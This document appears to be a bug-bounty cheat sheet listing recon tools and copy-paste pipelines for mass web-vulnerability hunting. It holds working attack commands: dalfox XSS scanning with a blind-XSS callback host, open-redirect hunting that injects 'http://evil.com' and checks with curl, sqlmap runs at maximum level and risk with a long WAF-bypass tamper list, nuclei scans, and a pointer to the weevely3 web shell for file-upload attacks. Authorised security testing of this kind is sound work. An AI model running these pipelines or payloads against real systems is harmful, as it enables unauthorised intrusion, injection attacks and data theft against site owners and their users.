- https://github.com/maurosoria/dirsearch
- https://github.com/MobSF/Mobile-Security-Framework-MobSF
- https://github.com/DanMcInerney/xsscrapy

- Burp Suite
- SecLists
- whatcms
- Striker
- OWASP ZAP
- Dirb
- Scrapy
- Dirbuster
- Gobuster
- Wfuzz
- CyberChef
- Sublist3r	
- Massdns
- Dnsenum
- Knockpy
- nmap 
- Masscan
- Sn1per
- XSStrike
- Sqlmap
- Wpscan
- Joomscan
- CMSmap
- Builtwith
- Wappalyzer
- wafw00f


- passive hunter
- a-mass
- subfinder
- httpx
- aquatone
- dalfox
- nuclei
- open redirect x
- massdns
- paramspider

### XSS Payloads (xsshunter)
- xalgord.xss.ht

## file upload vulnerability test
- https://github.com/epinna/weevely3

## XSS recon methodology
▶ cat domains.txt | waybackurls > urls

```
cat urls.txt        --> read the file
| kxss              --> filter special characters
| sed 's/=.*/=/'    --> remove everything after = ,add = 
| sed 's/URL: //'   --> remove URL: and white space
| dalfox pipe       --> dalfox tool for xss payload
-b xalgord.xss.ht   --> BXSS payload adder.
```

## Open Redirect Mass Hunt
- tool = ragno, qsreplace
```
python3 ragno.py -d intensedebate.com -s -q -o ragno_urls.txt
```
```
cat ragno_urls.txt | grep -a -i \=http | wc -w
```
```
cat ragno_urls.txt | grep -a -i \=http > potential_openredirect_vun.txt
```
```
cat potential_openredirect_vun.txt | qsreplace "http://evil.com" | wc -w
```
```
cat potential_openredirect_vun.txt | qsreplace "http://evil.com" > unique_potential_openredirect.txt
```
```
cat unique_potential_openredirect.txt | while read target_urls do; do curl -s -L $target_urls -I | grep "evil.com" && echo "[Vulnerable] $target_urls \n"; done
```



- Example: One Liner for Hunting Mass Open Redirect

```
python3 ragno.py -d test.vulnweb.com -s -q -o ragno_urls.txt | cat ragno_urls.txt | grep -a -i \=http | qsreplace "http://evil.com" | while read target_url do; do curl -s -L $target_url -I | grep "evil.com" && echo "[+] [Vulnerable] $target_url \n"; done

```


## Amass Command

```
amass enum -brute -o output.txt -d example.com -v
```

## Detect Low Hanging Bugs and Sensitive Information like API Keys, Secrets etc. including JS Files and HTML Pages


First run Amass Scan and save its output and then run Sublist3r with bruteforce mode and also save its output in different file. 
Now open a Website such as https://www.textfixer.com/tools/remove-duplicate-lines.php to remove duplicate subdomains.

Tool: https://github.com/BitTheByte/Eagle

Basic Usage:
```
python3 main.py -f domains.txt
```

Advanced Usage:
```
python3 main.py -f domains.txt -w 10 --db output.db.json
```

To check API keys if they vulnerable or not, use a tool such as gmapsapiscanner, it is usefull to save the time by automating the process and also if it gets any Vulnerable API, it will generate its POC itself.

Tool: https://github.com/ozguralp/gmapsapiscanner

Usage:
```
python3 maps_api_scanner_python3.py
```

## SQL Injection Methodologies
*try login with admin admin and send login request  to burp

*do an active scan

if show SQL injection with parameter 

#POC 

copy request in txt 

and on sqlmap 
```
sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter
```
and you have a valid SQL INJ 😎😎


## Reflected XSS On private program

1- 
```
amass enum -passive -norecursive -noalts -d domain .com -o domain.txt
```
2-
```
cat domian.txt | httpx -o domainhttpx.txt
```
3-
```
cat domainhttpx.txt | nuclei -t /home/orwa/nuclei-templates
```
DONE 😎


## Find SQL injections (command combo)
```
subfinder -d target.com | tee -a domains
cat domains | httpx | tee -a urls.alive
cat urls.alive | waybackurls | tee -a urls.check
gf sqli urls.check >> urls.sqli
sqlmap -m urls.sqli --dbs --batch
```
Here’s what’s going on in detail:

1. First we will find all subdomains under our target domain.
2. Next we will identify all alive web servers running on those subdomains.
3. Waybackurls will fetch all URLs that the Wayback Machine knows about the identified alive subdomains.
4. Now we will filter out URLs that match patterns with potential SQL injection.
5. The final step is to run sqlmap on all identified potentially vulnerable URLs and let it do its magic.

Protip: If you need to bypass WAF (Web Application Firewall) in the process, add the following options to sqlmap:
```
--level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned
```

## Get scope of Bugcrowd programs in CLI
There is a new tool in town called bcscope which can get you the scope of all bug bounty programs available on Bugcrowd platform, including the private ones.

All you have to do is to provide your Bugcrowd token like this:
```
bcscope -t <YOUR-TOKEN-HERE> -c 2 -p
```
![alt text](https://www.infosecmatter.com/wp-content/uploads/2020/10/list-scope-for-bugcrowd-bug-bounty-programs.jpg)
